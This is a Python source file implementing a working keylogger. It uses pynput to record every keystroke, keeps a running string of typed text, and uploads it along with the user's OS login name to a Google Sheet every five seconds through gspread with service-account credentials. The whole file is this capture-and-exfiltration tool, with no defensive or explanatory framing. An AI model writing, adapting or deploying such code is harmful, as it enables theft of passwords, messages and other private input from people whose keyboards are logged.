import threading
import time
import pynput
import gspread
import os
from oauth2client.service_account import ServiceAccountCredentials

# Authentication for Google Sheets

scope = ["https://spreadsheets.google.com/feeds","https://www.googleapis.com/auth/drive"]

jsonkeyfile = input("Enter your json keyfile name: ")

credentials = ServiceAccountCredentials.from_json_keyfile_name(str(jsonkeyfile), scope)

gc = gspread.authorize(credentials)

# Upload Name to Sheets

SheetName = input("Google Sheets Title: ")
wks = gc.open(str(SheetName)).sheet1
wks.update_cell(1,1,os.getlogin())

# Define Keys to Log
UploadString = "Inputs :"

# 
exitFlag = 0

# Upload Thread Function
class myThread (threading.Thread):
   def __init__(self, threadID, name, counter, cellcounter):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.name = name
      self.counter = counter
      self.cellcounter = cellcounter
   def run(self):
      print ("Starting " + self.name)
      print_time(self.name, self.counter, self.cellcounter)
      print ("Exiting " + self.name)

def print_time(threadName, delay, cellcounter):
   while True:
      if exitFlag:
         threadName.exit()
      wks.update_cell(cellcounter, 1, UploadString)
      time.sleep(delay)
      print ("%s: %s" % (threadName, time.ctime(time.time())))
      cellcounter += 1

# Key Log Fuction
def on_press(key):
    try:
        global UploadString
        UploadString = UploadString + key.char

    except AttributeError:
        print(key)
        if str(key) == "Key.space" or str(key) == "Key.enter":
            UploadString = UploadString + " "
        elif str(key) == "Key.backspace":
            if len(UploadString) > 8:
               UploadString = UploadString[:-1]

def on_release(key):
        print(UploadString)
        if key == pynput.keyboard.Key.esc:
            print("Exiting Main Thread")
            # Exit without prompt
            os._exit(0)

# Create new threads (threadid,name,time in seconds each loop)
UploadThread = myThread(1, "Upload Thread", 5 , 2)

# Start Threads
with pynput.keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    UploadThread.start()
    listener.join()
    UploadThread.join()
















